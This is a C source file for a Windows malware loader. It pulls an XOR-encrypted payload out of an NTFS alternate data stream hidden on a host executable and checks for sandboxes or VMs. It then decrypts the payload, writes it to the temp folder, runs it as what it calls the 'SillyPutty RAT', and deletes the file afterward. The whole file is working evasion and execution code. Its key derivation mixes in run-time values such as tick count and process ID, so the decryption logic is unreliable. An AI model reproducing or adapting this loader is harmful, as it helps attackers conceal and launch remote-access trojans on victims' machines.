#include <windows.h>
#include <stdio.h>

#define ADS_NAME ":s12data"

// S12's Advanced XOR Decryption (reverse of encryption)
void S12_AdvancedXOR_Decrypt(PBYTE data, DWORD size, PBYTE key, DWORD keySize) {
    DWORD keyIndex = 0;
    BYTE evolvedKey[256];
    
    // Initialize evolved key (same as encryption)
    for (DWORD i = 0; i < 256; i++) {
        evolvedKey[i] = key[i % keySize] ^ (BYTE)i;
    }
    
    // Reverse the 3-pass encryption
    for (int pass = 2; pass >= 0; pass--) {  // Reverse order
        keyIndex = 0;
        
        // Rebuild the key state for this pass
        BYTE tempKey[256];
        memcpy(tempKey, evolvedKey, 256);
        
        for (DWORD i = 0; i < size; i++) {
            // Reverse the XOR operations (same operations work for XOR)
            data[i] ^= (BYTE)pass;
            data[i] ^= (BYTE)((i >> 8) & 0xFF);
            data[i] ^= (BYTE)(i & 0xFF);
            data[i] ^= tempKey[keyIndex % 256];
            
            // Evolve key the same way as encryption
            tempKey[keyIndex % 256] += data[i] + i + pass;
            tempKey[keyIndex % 256] = ((tempKey[keyIndex % 256] << 1) | 
                                     (tempKey[keyIndex % 256] >> 7));
            
            keyIndex = (keyIndex + 1) % 256;
        }
        
        // Reset for next pass
        keyIndex = (keyIndex * 17 + 42) % 256;
    }
}

// S12's Key Obfuscation (same as encryption)
void S12_GenerateObfuscatedKey(PBYTE key, DWORD keySize, const char* seed) {
    DWORD seedHash = 0x811C9DC5;
    
    for (int i = 0; seed[i]; i++) {
        seedHash ^= seed[i];
        seedHash *= 0x01000193;
    }
    
    DWORD entropy1 = GetTickCount();
    DWORD entropy2 = GetCurrentProcessId();
    DWORD entropy3 = (DWORD)GetCurrentThreadId();
    
    for (DWORD i = 0; i < keySize; i++) {
        key[i] = (BYTE)((seedHash >> (i % 4) * 8) ^ 
                       (entropy1 >> (i % 4) * 8) ^
                       (entropy2 >> (i % 4) * 8) ^
                       (entropy3 >> (i % 4) * 8) ^
                       (i * 37));
        
        seedHash = ((seedHash << 5) + seedHash) + i;
    }
}

// Environment check before execution
BOOL S12_EnvironmentCheck() {
    printf("S12's Environment Analysis\n");
    printf("=========================\n");
    
    // Basic checks
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    if (si.dwNumberOfProcessors < 2) {
        printf("Single CPU detected - possible VM\n");
        return FALSE;
    }
    
    MEMORYSTATUSEX memStatus = {sizeof(memStatus)};
    GlobalMemoryStatusEx(&memStatus);
    
    if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
        printf("Low memory detected - possible sandbox\n");
        return FALSE;
    }
    
    printf("Environment appears normal\n");
    return TRUE;
}

// Extract and execute hidden malware
BOOL S12_ExtractAndExecute(const char* hostFile, const char* keySeed) {
    printf("S12's ADS Malware Extractor\n");
    printf("===========================\n");
    printf("Host file: %s\n", hostFile);
    printf("Key seed: %s\n\n", keySeed);
    
    // Check environment first
    if (!S12_EnvironmentCheck()) {
        printf("Environment check failed - aborting\n");
        return FALSE;
    }
    
    // Build ADS path
    char adsPath[MAX_PATH];
    snprintf(adsPath, sizeof(adsPath), "%s%s", hostFile, ADS_NAME);
    
    // Open ADS stream
    HANDLE hADS = CreateFileA(adsPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hADS == INVALID_HANDLE_VALUE) {
        printf("Error: Cannot access hidden payload (ADS not found)\n");
        return FALSE;
    }
    
    // Get payload size
    DWORD payloadSize = GetFileSize(hADS, NULL);
    printf("Hidden payload size: %lu bytes\n", payloadSize);
    
    // Read encrypted payload
    PBYTE encryptedPayload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, payloadSize);
    DWORD bytesRead;
    ReadFile(hADS, encryptedPayload, payloadSize, &bytesRead, NULL);
    CloseHandle(hADS);
    
    printf("Encrypted payload extracted: %lu bytes\n", bytesRead);
    
    // Generate decryption key
    BYTE decryptionKey[64];
    S12_GenerateObfuscatedKey(decryptionKey, sizeof(decryptionKey), keySeed);
    printf("Decryption key generated\n");
    
    // Decrypt the payload
    printf("Decrypting with S12's algorithm...\n");
    S12_AdvancedXOR_Decrypt(encryptedPayload, payloadSize, decryptionKey, sizeof(decryptionKey));
    
    // Save decrypted malware to temporary file
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char tempFile[MAX_PATH];
    snprintf(tempFile, sizeof(tempFile), "%s\\s12_extracted_malware.exe", tempPath);
    
    HANDLE hTemp = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTemp == INVALID_HANDLE_VALUE) {
        printf("Error: Cannot create temporary file\n");
        HeapFree(GetProcessHeap(), 0, encryptedPayload);
        return FALSE;
    }
    
    DWORD bytesWritten;
    WriteFile(hTemp, encryptedPayload, payloadSize, &bytesWritten, NULL);
    CloseHandle(hTemp);
    
    printf("Decrypted malware saved: %s (%lu bytes)\n", tempFile, bytesWritten);
    
    // Execute the malware
    printf("Executing extracted SillyPutty malware...\n");
    
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    
    if (CreateProcessA(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("✅ SillyPutty RAT executed successfully!\n");
        printf("Process ID: %lu\n", pi.dwProcessId);
        
        // Close handles
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        // Clean up temp file after a delay
        Sleep(5000);
        DeleteFileA(tempFile);
        
    } else {
        printf("❌ Failed to execute malware (Error: %lu)\n", GetLastError());
        DeleteFileA(tempFile);
        HeapFree(GetProcessHeap(), 0, encryptedPayload);
        return FALSE;
    }
    
    HeapFree(GetProcessHeap(), 0, encryptedPayload);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("S12's ADS Malware Extractor v1.0\n");
        printf("=================================\n");
        printf("Usage: %s <host_file> <key_seed>\n", argv[0]);
        printf("\nExample: %s s12_calculator.exe s12secret2025\n", argv[0]);
        printf("\nThis tool extracts and executes malware hidden in ADS streams\n");
        printf("using S12's advanced decryption techniques.\n");
        return 1;
    }
    
    const char* hostFile = argv[1];
    const char* keySeed = argv[2];
    
    printf("🚀 S12's ADS Malware Extraction Tool\n");
    printf("====================================\n\n");
    
    if (S12_ExtractAndExecute(hostFile, keySeed)) {
        printf("\n🎯 Mission accomplished!\n");
        printf("The hidden SillyPutty RAT is now active.\n");
    } else {
        printf("\n❌ Extraction failed.\n");
    }
    
    return 0;
}
